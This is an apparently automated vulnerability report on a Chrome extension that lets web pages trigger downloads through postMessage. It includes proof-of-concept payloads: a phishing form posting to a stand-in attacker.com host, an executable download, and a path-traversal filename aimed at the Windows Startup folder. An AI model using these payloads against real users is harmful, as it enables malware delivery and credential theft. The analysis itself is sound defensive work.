# CoCo Analysis: pgmcojeijjhacgkkjaakdafmloncpema

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both chrome_downloads_download_sink - filename and url parameters)

---

## Sink 1: cs_window_eventListener_message → chrome_downloads_download_sink (data/url parameter)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/cs_0.js
Line 475	window.addEventListener("message", event => {
	event
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/cs_0.js
Line 478		if (event.data.type === "replit_download") {
	event.data
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/cs_0.js
Line 483				data: event.data.data,
	event.data.data
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/bg.js
Line 974				url: "data:text/plain;charset=utf-8," + encodeURIComponent(request.data),
	encodeURIComponent(request.data)
```

**Code:**

```javascript
// Content script (cs_0.js) - Lines 475-487
// Entry point: window.postMessage listener
window.addEventListener("message", event => {
    // if the event was to download, send a download request to the background script
    if (event.data.type === "replit_download") { // <- attacker sets type
        // send request to background script
        chrome.runtime.sendMessage({
            type: "download",
            data: event.data.data, // <- attacker-controlled data
            extension: event.data.extension, // <- attacker-controlled extension
        });
    }
});

// Background script (bg.js) - Lines 966-978
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    // if the request was to start a download, start a download
    if (request.type === "download") {
        // start the download
        chrome.downloads.download({
            filename: "program." + request.extension, // <- attacker controls extension
            url: "data:text/plain;charset=utf-8," + encodeURIComponent(request.data), // SINK: attacker controls content
            saveAs: true
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// From any webpage where the content script runs (https://repl.it/*)
// Note: Per CRITICAL ANALYSIS RULE 1, we IGNORE content_scripts matches restrictions.
// If window.addEventListener("message") exists, assume ANY attacker can trigger it.

window.postMessage({
    type: "replit_download",
    data: "malicious payload here\nwindows executable code\nor phishing content",
    extension: "exe" // attacker controls file extension
}, "*");

// More dangerous example - social engineering attack:
window.postMessage({
    type: "replit_download",
    data: "<html><body><h1>Your account has been locked</h1><form action='http://attacker.com/phish'>...</form></body></html>",
    extension: "html"
}, "*");
```

**Impact:** Attacker can trigger arbitrary file downloads with full control over both the file content (via data URL) and filename (including extension). This enables:
1. Downloading malware with executable extensions (.exe, .bat, .sh, etc.)
2. Creating phishing pages disguised as legitimate files
3. Social engineering attacks by downloading files with misleading names and content
4. Bypassing browser download protections through extension privileges

---

## Sink 2: cs_window_eventListener_message → chrome_downloads_download_sink (filename parameter)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/cs_0.js
Line 475	window.addEventListener("message", event => {
	event
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/cs_0.js
Line 478		if (event.data.type === "replit_download") {
	event.data
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/cs_0.js
Line 484				extension: event.data.extension,
	event.data.extension
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pgmcojeijjhacgkkjaakdafmloncpema/opgen_generated_files/bg.js
Line 973				filename: "program." + request.extension,
```

**Code:**

```javascript
// Same flow as Sink 1, but focusing on filename control
// Content script forwards event.data.extension to background
// Background constructs filename with attacker-controlled extension

chrome.downloads.download({
    filename: "program." + request.extension, // SINK: attacker controls extension/filename
    url: "data:text/plain;charset=utf-8," + encodeURIComponent(request.data),
    saveAs: true
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// Download malicious file with dangerous extension
window.postMessage({
    type: "replit_download",
    data: "MZ\x90\x00...", // Windows PE executable header
    extension: "exe"
}, "*");

// Or use path traversal to write to unexpected locations
window.postMessage({
    type: "replit_download",
    data: "malicious content",
    extension: "../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/malware.bat"
}, "*");
```

**Impact:** Attacker controls the file extension and can potentially manipulate the filename. This allows downloading files with dangerous extensions (.exe, .bat, .scr, etc.) that may bypass user caution or OS security warnings, especially when combined with control over file content (Sink 1).
